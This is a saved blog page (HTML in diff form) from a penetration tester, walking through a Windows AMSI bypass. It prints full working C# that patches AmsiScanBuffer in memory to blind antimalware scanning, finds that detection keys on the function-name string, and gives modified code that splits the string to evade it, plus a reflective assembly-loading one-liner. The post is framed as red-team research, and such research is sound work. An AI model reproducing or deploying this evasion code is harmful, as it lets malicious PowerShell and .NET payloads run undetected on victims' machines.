@@ -1,0 +1,970 @@
+
+
+  
+    
+  
+
+
+  
+
+
+
+
+  
+
+
+  
+
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="generator" content="Hugo 0.53">
+    <meta name="theme" content="Tranquilpeak 0.3.1-BETA">
+    <title>AmsiScanBuffer Bypass - Part 1</title>
+    <meta name="author" content="Rasta Mouse">
+    <meta name="keywords" content="">
+
+    <link rel="icon" href="https://rastamouse.me/favicon.ico">
+    
+
+    
+    <meta name="description" content="Andre Marques recently posted a pretty nice write-up for circumventing AMSI, based on previous work by CyberArk.">
+    <meta property="og:description" content="Andre Marques recently posted a pretty nice write-up for circumventing AMSI, based on previous work by CyberArk.">
+    <meta property="og:type" content="blog">
+    <meta property="og:title" content="AmsiScanBuffer Bypass - Part 1">
+    <meta property="og:url" content="/2018/10/amsiscanbuffer-bypass-part-1/">
+    <meta property="og:site_name" content="Rasta Mouse">
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:title" content="Rasta Mouse">
+    <meta name="twitter:description" content="Andre Marques recently posted a pretty nice write-up for circumventing AMSI, based on previous work by CyberArk.">
+    
+      <meta name="twitter:creator" content="@_RastaMouse">
+    
+    
+
+    
+    
+
+    
+      <meta property="og:image" content="//www.gravatar.com/avatar/2b44f5ca5458931c49e1fa57da6705c1?s=640">
+    
+
+    
+      <meta property="og:image" content="https://rastamouse.me/images/asb-bypass-pt1/thumb.jpg">
+    
+    
+    
+
+    
+
+    
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" />
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/jquery.fancybox.css" />
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/helpers/jquery.fancybox-thumbs.min.css" />
+    
+    
+    <link rel="stylesheet" href="https://rastamouse.me/css/style-u6mk0ojoywresbx8iepslrmmhl4stuhrsxuwhkpwrkrx7mryjcaimasnk4pi.min.css" />
+    
+    
+
+    
+      
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-60712346-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+    
+    
+  </head>
+
+  <body>
+    <div id="blog">
+      <header id="header" data-behavior="4"> 
+  <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+  <div class="header-title">
+    <a class="header-title-link" href="https://rastamouse.me/">Rasta Mouse</a>
+  </div>
+  
+    
+      <a class="header-right-picture "
+         href="https://rastamouse.me/#about">
+    
+    
+    
+      
+        <img class="header-picture" src="//www.gravatar.com/avatar/2b44f5ca5458931c49e1fa57da6705c1?s=90" alt="Author&#39;s picture" />
+      
+    
+    </a>
+  
+</header>
+      <nav id="sidebar" data-behavior="4">
+  <div class="sidebar-container">
+    
+      <div class="sidebar-profile">
+        <a href="https://rastamouse.me/#about">
+          <img class="sidebar-profile-picture" src="//www.gravatar.com/avatar/2b44f5ca5458931c49e1fa57da6705c1?s=110" alt="Author&#39;s picture" />
+        </a>
+        <h4 class="sidebar-profile-name">Rasta Mouse</h4>
+        
+          <h5 class="sidebar-profile-bio">Taylor Swift fan, wannabe Red Teamer &amp; 1337 hax0r (in that order).</h5>
+        
+      </div>
+    
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://rastamouse.me/categories">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-bookmark"></i>
+      
+      <span class="sidebar-button-desc">Categories</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://rastamouse.me/tags">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-tags"></i>
+      
+      <span class="sidebar-button-desc">Tags</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://rastamouse.me/archives">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-archive"></i>
+      
+      <span class="sidebar-button-desc">Archives</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://rastamouse.me/#about">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-question"></i>
+      
+      <span class="sidebar-button-desc">About</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://rastamouse.me/">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-home"></i>
+      
+      <span class="sidebar-button-desc">Home</span>
+    </a>
+  </li>
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://twitter.com/_RastaMouse" target="_blank">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-twitter"></i>
+      
+      <span class="sidebar-button-desc">Twitter</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://keybase.io/rasta_mouse" target="_blank">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-lock"></i>
+      
+      <span class="sidebar-button-desc">Keybase</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://zeropointsecurity.co.uk/rastalabs/" target="_blank">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-shield"></i>
+      
+      <span class="sidebar-button-desc">RastaLabs</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://github.com/rasta-mouse" target="_blank">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-github"></i>
+      
+      <span class="sidebar-button-desc">GitHub</span>
+    </a>
+  </li>
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://rastamouse.me/index.xml">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-rss"></i>
+      
+      <span class="sidebar-button-desc">RSS</span>
+    </a>
+  </li>
+
+    </ul>
+  </div>
+</nav>
+
+      
+
+      <div id="main" data-behavior="4"
+        class="
+               hasCoverMetaIn
+               ">
+        <article class="post" itemscope itemType="http://schema.org/BlogPosting">
+          
+          
+            <div class="post-header main-content-wrap text-left">
+  
+    <h1 class="post-title" itemprop="headline">
+      AmsiScanBuffer Bypass - Part 1
+    </h1>
+  
+  <div class="postShorten-meta post-meta">
+  
+    <time itemprop="datePublished" datetime="2018-10-29T00:00:00Z">
+      
+  
+  
+  
+  
+    29 October 2018
+  
+
+    </time>
+  
+  
+  
+  
+    <span>in</span>
+    
+      <a class="category-link" href="https://rastamouse.me/categories/blog">blog</a>
+    
+  
+
+
+</div>
+
+</div>
+          
+          <div class="post-content markdown" itemprop="articleBody">
+            <div class="main-content-wrap">
+              <p><a href="https://twitter.com/_zc00l">Andre Marques</a> recently <a href="https://twitter.com/_zc00l/status/1056523259246718976">posted</a> a pretty nice <a href="https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html">write-up</a> for circumventing AMSI, based on previous work by <a href="https://www.cyberark.com/threat-research-blog/amsi-bypass-redux/">CyberArk</a>.</p>
+
+<p>Please read these for all the technical details - we&rsquo;re launching this post with the C# code from Andre:</p>
+
+<pre><code class="language-c#">using System;
+using System.Runtime.InteropServices;
+
+namespace Bypass
+{
+    public class AMSI
+    {
+        [DllImport(&quot;kernel32&quot;)]
+        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+        [DllImport(&quot;kernel32&quot;)]
+        public static extern IntPtr LoadLibrary(string name);
+        [DllImport(&quot;kernel32&quot;)]
+        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+        [DllImport(&quot;Kernel32.dll&quot;, EntryPoint = &quot;RtlMoveMemory&quot;, SetLastError = false)]
+        static extern void MoveMemory(IntPtr dest, IntPtr src, int size);
+
+
+        public static int Disable()
+        {
+            IntPtr TargetDLL = LoadLibrary(&quot;amsi.dll&quot;);
+            if (TargetDLL == IntPtr.Zero)
+            {
+                Console.WriteLine(&quot;ERROR: Could not retrieve amsi.dll pointer.&quot;);
+                return 1;
+            }
+
+            IntPtr AmsiScanBufferPtr = GetProcAddress(TargetDLL, &quot;AmsiScanBuffer&quot;);
+            if (AmsiScanBufferPtr == IntPtr.Zero)
+            {
+                Console.WriteLine(&quot;ERROR: Could not retrieve AmsiScanBuffer function pointer&quot;);
+                return 1;
+            }
+
+            UIntPtr dwSize = (UIntPtr)5;
+            uint Zero = 0;
+            if (!VirtualProtect(AmsiScanBufferPtr, dwSize, 0x40, out Zero))
+            {
+                Console.WriteLine(&quot;ERROR: Could not change AmsiScanBuffer memory permissions!&quot;);
+                return 1;
+            }
+
+            /*
+             * This is a new technique, and is still working.
+             * Source: https://www.cyberark.com/threat-research-blog/amsi-bypass-redux/
+             */
+            Byte[] Patch = { 0x31, 0xff, 0x90 };
+            IntPtr unmanagedPointer = Marshal.AllocHGlobal(3);
+            Marshal.Copy(Patch, 0, unmanagedPointer, 3);
+            MoveMemory(AmsiScanBufferPtr + 0x001b, unmanagedPointer, 3);
+
+            Console.WriteLine(&quot;AmsiScanBuffer patch has been applied.&quot;);
+            return 0;
+        }
+    }
+}
+</code></pre>
+
+<p>I don&rsquo;t think it&rsquo;s clear from Andre&rsquo;s post which version of Windows 10 he was testing against, but the CyberArk post specifically references 1709 (17074) and was originally posted on 23 May 2018.  Microsoft have been doing a really effective job as of late, with keeping Defender and AMSI up-to-date.  Even though MSRC said they would not fix it, they did say:</p>
+
+<blockquote>
+<p>We don’t see this as a security vulnerability – but we’ll definitely look into what we can do to prevent (or detect) this type of attacks.</p>
+</blockquote>
+
+<p>So at the time of writing (29 October 2018), I&rsquo;m on Windows 10 1803 (17134).  Does this bypass still work?  Turns out the answer is yes, and no.</p>
+
+<p>I copied the code verbatim, compiled to a DLL and attempted to load it via reflection, which failed:</p>
+
+<figure>
+    <img src="https://rastamouse.me/images/asb-bypass-pt1/fail.png"/> 
+</figure>
+
+
+<p>Not a good start.</p>
+
+<p>I had some suspects in mind, such as:</p>
+
+<ul>
+<li><code>IntPtr TargetDLL = LoadLibrary(&quot;amsi.dll&quot;);</code>  &lt;- Maybe just loading AMSI is bad, but unlikely.</li>
+<li><code>IntPtr AmsiScanBufferPtr = GetProcAddress(TargetDLL, &quot;AmsiScanBuffer&quot;);</code>  &lt;- Finding the address of AmsiScanBuffer.</li>
+<li><code>if (!VirtualProtect(AmsiScanBufferPtr, dwSize, 0x40, out Zero))</code>  &lt;- Modifying the permissions of a memory region.</li>
+</ul>
+
+<p>And pretty much all of this&hellip;</p>
+
+<pre><code>Byte[] Patch = { 0x31, 0xff, 0x90 };
+IntPtr unmanagedPointer = Marshal.AllocHGlobal(3);
+Marshal.Copy(Patch, 0, unmanagedPointer, 3);
+MoveMemory(AmsiScanBufferPtr + 0x001b, unmanagedPointer, 3);
+</code></pre>
+
+<p>Because the code is relatively short, I thought I would just step through it line-by-line to see if I could find the offending content.  I did this in PowerShell ISE, by putting all the C# into a text variable and &ldquo;running&rdquo; the script.  Then, systematically removing a couple of lines of code each time, until I got to the point AMSI wasn&rsquo;t flagging anymore.</p>
+
+<p>To simplfy the process, I shortened the code a bit more by removing the <code>if</code> statements and removing console output. So my version became:</p>
+
+<pre><code class="language-c#">using System;
+using System.Runtime.InteropServices;
+
+namespace Bypass
+{
+    public class AMSI
+    {
+        [DllImport(&quot;kernel32&quot;)]
+        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+        [DllImport(&quot;kernel32&quot;)]
+        public static extern IntPtr LoadLibrary(string name);
+        [DllImport(&quot;kernel32&quot;)]
+        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+        [DllImport(&quot;Kernel32.dll&quot;, EntryPoint = &quot;RtlMoveMemory&quot;, SetLastError = false)]
+        static extern void MoveMemory(IntPtr dest, IntPtr src, int size);
+
+        public static int Disable()
+        {
+            IntPtr TargetDLL = LoadLibrary(&quot;amsi.dll&quot;);
+            IntPtr AmsiScanBufferPtr = GetProcAddress(TargetDLL, &quot;AmsiScanBuffer&quot;);
+
+            UIntPtr dwSize = (UIntPtr)5;
+            uint Zero = 0;
+
+            VirtualProtect(AmsiScanBufferPtr, dwSize, 0x40, out Zero);
+
+            Byte[] Patch = { 0x31, 0xff, 0x90 };
+            IntPtr unmanagedPointer = Marshal.AllocHGlobal(3);
+            Marshal.Copy(Patch, 0, unmanagedPointer, 3);
+            MoveMemory(AmsiScanBufferPtr + 0x001b, unmanagedPointer, 3);
+
+            return 0;
+        }
+    }
+}
+</code></pre>
+
+<p>Eventually, I found only 3 lines were causing the alerts. <code>IntPtr AmsiScanBufferPtr = GetProcAddress(TargetDLL, &quot;AmsiScanBuffer&quot;);</code>, <code>if (!VirtualProtect(AmsiScanBufferPtr, dwSize, 0x40, out Zero))</code> and <code>MoveMemory(AmsiScanBufferPtr + 0x001b, unmanagedPointer, 3);</code>.</p>
+
+<p>The one thing they all have in common&hellip;?  Yep, the string (or substring) <code>AmsiScanBuffer</code>!</p>
+
+<p>You can actually test this by just typing it into a PowerShell window&hellip;</p>
+
+<figure>
+    <img src="https://rastamouse.me/images/asb-bypass-pt1/amsiscanbuffer.png"/> 
+</figure>
+
+
+<p>And some funny consequences&hellip;</p>
+
+<figure>
+    <img src="https://rastamouse.me/images/asb-bypass-pt1/cd.png"/> 
+</figure>
+
+
+<p>It&rsquo;s also worth noting <code>&quot;Amsi Scan Buffer&quot;</code> also flags, but others like <code>&quot;AmsixScanxBuffer&quot;</code> or <code>&quot;Amsi.Scan.Buffer&quot;</code> are fine.</p>
+
+<p>But this also means the reason my first reflection test failed, was probably down to this string being in my path and not the actual file itself.  So I renamed everything and tried again&hellip;</p>
+
+<figure>
+    <img src="https://rastamouse.me/images/asb-bypass-pt1/reflection.png"/> 
+</figure>
+
+
+<p>Success.</p>
+
+<p>This is still only a &ldquo;somewhat limited&rdquo; solution, because there are more ways we might want to load this code.  If we want to use this directly in a PowerShell script, we could do <code>[System.Reflection.Assembly]::Load([System.Convert]::FromBase64String(&quot;&quot;))</code> without issue, which to be honest, is probably the most elegant way.</p>
+
+<figure>
+    <img src="https://rastamouse.me/images/asb-bypass-pt1/base64.png"/> 
+</figure>
+
+
+<p>But if we want to do it this way, we&rsquo;re still stuck.</p>
+
+<pre><code>$Ref = (
+    [...]
+)
+
+$Source = @&quot;
+[...]
+&quot;@
+
+Add-Type [...]
+</code></pre>
+
+<p>Of course, this is relatively straight forward to fix.</p>
+
+<p><code>IntPtr AmsiScanBufferPtr = GetProcAddress(TargetDLL, &quot;AmsiScanBuffer&quot;);</code> becomes <code>IntPtr ASBPtr = GetProcAddress(TargetDLL, &quot;Amsi&quot; + &quot;Scan&quot; + &quot;Buffer&quot;);</code>.</p>
+
+<p><code>VirtualProtect(AmsiScanBufferPtr, (UIntPtr) 5, 0x40, out uint Zero);</code> becomes <code>VirtualProtect(ASBPtr, dwSize, 0x40, out Zero);</code>.</p>
+
+<p><code>MoveMemory(AmsiScanBufferPtr + 0x001b, unmanagedPointer, 3);</code> becomes <code>MoveMemory(ASBPtr + 0x001b, unmanagedPointer, 3);</code>.</p>
+
+<figure>
+    <img src="https://rastamouse.me/images/asb-bypass-pt1/ise.png"/> 
+</figure>
+              
+            </div>
+          </div>
+          <div id="post-footer" class="post-footer main-content-wrap">
+            
+              
+                
+                
+                  <div class="post-footer-tags">
+                    <span class="text-color-light text-small">TAGGED IN</span><br/>
+                    
+  <a class="tag tag--primary tag--small" href="https://rastamouse.me/tags/amsi/">AMSI</a>
+
+  <a class="tag tag--primary tag--small" href="https://rastamouse.me/tags/bypass/">Bypass</a>
+
+                  </div>
+                
+              
+            
+            <div class="post-actions-wrap">
+  <nav>
+    <ul class="post-actions post-action-nav">
+      
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--default tooltip--top" href="https://rastamouse.me/2018/10/amsiscanbuffer-bypass-part-2/" data-tooltip="AmsiScanBuffer Bypass - Part 2">
+          
+            <i class="fa fa-angle-left"></i>
+            <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
+          </a>
+        </li>
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--default tooltip--top" href="https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/" data-tooltip="A Lesson in .NET Framework Versions">
+          
+            <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
+            <i class="fa fa-angle-right"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </nav>
+  <ul class="post-actions post-action-share">
+    
+      <li class="post-action hide-lg hide-md hide-sm">
+        <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
+          <i class="fa fa-share-alt"></i>
+        </a>
+      </li>
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https%3a%2f%2frastamouse.me%2f2018%2f10%2famsiscanbuffer-bypass-part-1%2f">
+          <i class="fa fa-google-plus"></i>
+        </a>
+      </li>
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2frastamouse.me%2f2018%2f10%2famsiscanbuffer-bypass-part-1%2f">
+          <i class="fa fa-facebook-official"></i>
+        </a>
+      </li>
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https%3a%2f%2frastamouse.me%2f2018%2f10%2famsiscanbuffer-bypass-part-1%2f">
+          <i class="fa fa-twitter"></i>
+        </a>
+      </li>
+    
+    
+      <li class="post-action">
+        <a class="post-action-btn btn btn--default" href="#disqus_thread">
+          <i class="fa fa-comment-o"></i>
+        </a>
+      </li>
+    
+    <li class="post-action">
+      
+        <a class="post-action-btn btn btn--default" href="#">
+      
+        <i class="fa fa-list"></i>
+      </a>
+    </li>
+  </ul>
+</div>
+
+
+            
+              
+                <div id="disqus_thread">
+  <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+              
+            
+          </div>
+        </article>
+        <footer id="footer" class="main-content-wrap">
+  <span class="copyrights">
+    &copy; 2018 Rasta Mouse. All Rights Reserved
+  </span>
+</footer>
+
+      </div>
+      <div id="bottom-bar" class="post-bottom-bar" data-behavior="4">
+        <div class="post-actions-wrap">
+  <nav>
+    <ul class="post-actions post-action-nav">
+      
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--default tooltip--top" href="https://rastamouse.me/2018/10/amsiscanbuffer-bypass-part-2/" data-tooltip="AmsiScanBuffer Bypass - Part 2">
+          
+            <i class="fa fa-angle-left"></i>
+            <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
+          </a>
+        </li>
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--default tooltip--top" href="https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/" data-tooltip="A Lesson in .NET Framework Versions">
+          
+            <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
+            <i class="fa fa-angle-right"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </nav>
+  <ul class="post-actions post-action-share">
+    
+      <li class="post-action hide-lg hide-md hide-sm">
+        <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
+          <i class="fa fa-share-alt"></i>
+        </a>
+      </li>
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https%3a%2f%2frastamouse.me%2f2018%2f10%2famsiscanbuffer-bypass-part-1%2f">
+          <i class="fa fa-google-plus"></i>
+        </a>
+      </li>
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2frastamouse.me%2f2018%2f10%2famsiscanbuffer-bypass-part-1%2f">
+          <i class="fa fa-facebook-official"></i>
+        </a>
+      </li>
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https%3a%2f%2frastamouse.me%2f2018%2f10%2famsiscanbuffer-bypass-part-1%2f">
+          <i class="fa fa-twitter"></i>
+        </a>
+      </li>
+    
+    
+      <li class="post-action">
+        <a class="post-action-btn btn btn--default" href="#disqus_thread">
+          <i class="fa fa-comment-o"></i>
+        </a>
+      </li>
+    
+    <li class="post-action">
+      
+        <a class="post-action-btn btn btn--default" href="#">
+      
+        <i class="fa fa-list"></i>
+      </a>
+    </li>
+  </ul>
+</div>
+
+
+      </div>
+      <div id="share-options-bar" class="share-options-bar" data-behavior="4">
+  <ul class="share-options">
+    <li class="share-option">
+      <a class="share-option-btn" target="new" href="https://plus.google.com/share?url=https%3a%2f%2frastamouse.me%2f2018%2f10%2famsiscanbuffer-bypass-part-1%2f">
+        <i class="fa fa-google-plus"></i><span>Share on Google Plus</span>
+      </a>
+    </li>
+    <li class="share-option">
+      <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2frastamouse.me%2f2018%2f10%2famsiscanbuffer-bypass-part-1%2f">
+        <i class="fa fa-facebook-official"></i><span>Share on Facebook</span>
+      </a>
+    </li>
+    <li class="share-option">
+      <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https%3a%2f%2frastamouse.me%2f2018%2f10%2famsiscanbuffer-bypass-part-1%2f">
+        <i class="fa fa-twitter"></i><span>Share on Twitter</span>
+      </a>
+    </li>
+  </ul>
+</div>
+<div id="share-options-mask" class="share-options-mask"></div>
+    </div>
+    
+    <div id="about">
+  <div id="about-card">
+    <div id="about-btn-close">
+      <i class="fa fa-remove"></i>
+    </div>
+    
+      <img id="about-card-picture" src="//www.gravatar.com/avatar/2b44f5ca5458931c49e1fa57da6705c1?s=110" alt="Author&#39;s picture" />
+    
+    <h4 id="about-card-name">Rasta Mouse</h4>
+    
+      <div id="about-card-bio">Taylor Swift fan, wannabe Red Teamer &amp; 1337 hax0r (in that order).</div>
+    
+    
+      <div id="about-card-job">
+        <i class="fa fa-briefcase"></i>
+        <br/>
+        Penetration Tester
+      </div>
+    
+    
+      <div id="about-card-location">
+        <i class="fa fa-map-marker"></i>
+        <br/>
+        UK
+      </div>
+    
+  </div>
+</div>
+
+    <div id="algolia-search-modal" class="modal-container">
+  <div class="modal">
+    <div class="modal-header">
+      <span class="close-button"><i class="fa fa-close"></i></span>
+      <a href="https://algolia.com" target="_blank" class="searchby-algolia text-color-light link-unstyled">
+        <span class="searchby-algolia-text text-color-light text-small">by</span>
+        <img class="searchby-algolia-logo" src="https://www.algolia.com/static_assets/images/press/downloads/algolia-light.svg">
+      </a>
+      <i class="search-icon fa fa-search"></i>
+      <form id="algolia-search-form">
+        <input type="text" id="algolia-search-input" name="search"
+          class="form-control input--large search-input" placeholder="Search" />
+      </form>
+    </div>
+    <div class="modal-body">
+      <div class="no-result text-color-light text-center">no post found</div>
+      <div class="results">
+        
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://rastamouse.me/2018/12/amsiscanbuffer-bypass-part-4/">
+                <h3 class="media-heading">AmsiScanBuffer Bypass - Part 4</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Dec 12, 2018
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p>As 2018 rapidly comes to an end, I thought I&rsquo;d close out the year by clearing up some confusions over this AmsiScanBuffer bypass and why it appears to fail under some circumstances.</p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://rastamouse.me/2018/11/amsiscanbuffer-bypass-part-3/">
+                <h3 class="media-heading">AmsiScanBuffer Bypass - Part 3</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Nov 11, 2018
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p>In <a href="https://rastamouse.me/2018/10/amsiscanbuffer-bypass---part-2/">Part 2</a>, we engineered a delivery method for the AmsiScanBuffer Bypass discussed in <a href="https://rastamouse.me/2018/10/amsiscanbuffer-bypass---part-1/">Part 1</a>.  In this post, we&rsquo;ll make some modifications to the bypass itself.</p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://rastamouse.me/2018/10/amsiscanbuffer-bypass-part-2/">
+                <h3 class="media-heading">AmsiScanBuffer Bypass - Part 2</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Oct 10, 2018
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p>In <a href="https://rastamouse.me/2018/10/amsiscanbuffer-bypass---part-1/">Part 1</a>, we had a brief look at the AmsiScanBuffer bypass technique.  We found some circumstances where the bypass code would be identified as malicious before it could be executed (which turned out to be a simple string detection), and modified the code to circumvent this.</p>
+
+<p>In this post, we&rsquo;ll explore a delivery method to help stage a Cobalt Strike / Empire / &lt;insert framework here&gt; agent.  As with Part 1, this is not about some 1337 code drop - it&rsquo;s a demonstration of how I walked through engineering the final result.</p>
+
+<p>So, let&rsquo;s get cracking.</p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://rastamouse.me/2018/10/amsiscanbuffer-bypass-part-1/">
+                <h3 class="media-heading">AmsiScanBuffer Bypass - Part 1</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Oct 10, 2018
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p><a href="https://twitter.com/_zc00l">Andre Marques</a> recently <a href="https://twitter.com/_zc00l/status/1056523259246718976">posted</a> a pretty nice <a href="https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html">write-up</a> for circumventing AMSI, based on previous work by <a href="https://www.cyberark.com/threat-research-blog/amsi-bypass-redux/">CyberArk</a>.</p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/">
+                <h3 class="media-heading">A Lesson in .NET Framework Versions</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Sep 9, 2018
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p>With the emergence of more C# and .NET tooling, I occasionally see people tripping up over this.  It&rsquo;s not a huge issue, just something to be aware of.</p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://rastamouse.me/2018/09/enumerating-applocker-config/">
+                <h3 class="media-heading">Enumerating AppLocker Config</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Sep 9, 2018
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p>Very quick post to explore some different ways to enumerate the AppLocker configuration being applied to a host, both remotely and locally.  Understanding these rules, particularly deny rules, are useful for engineering bypasses.</p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://rastamouse.me/2018/06/rdpclip/">
+                <h3 class="media-heading">RDPClip</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Jun 6, 2018
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p>This is just a quick post to demonstrate some interesting aspects of the Remote Desktop Clipboard Monitor.</p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://rastamouse.me/2018/05/csharp-dotnettojscript-xsl/">
+                <h3 class="media-heading">CSharp, DotNetToJScript, XSL</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  May 5, 2018
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p>In April 2018, <a href="https://twitter.com/subTee">Casey Smith</a> published a finding he dubbed <a href="http://subt0x11.blogspot.co.uk/2018/04/wmicexe-whitelisting-bypass-hacking.html">squiblytwo</a>, which detailed how WMIC can be used to invoke arbitary code contained in the extensible stylesheet language (XSL) format.</p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://rastamouse.me/2018/05/review-active-directory-attacks-for-red-and-blue-teams/">
+                <h3 class="media-heading">Review: Active Directory Attacks for Red and Blue Teams</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  May 5, 2018
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p>Along with <a href="https://twitter.com/Cneelis">Cn33liz</a>, I recently had the pleasure of assisting <a href="https://twitter.com/nikhil_mitt">Nikhil Mittal</a> with his 2018 BruCON spring training: Active Directory Attacks for Red and Blue Teams.</p></div>
+            </div>
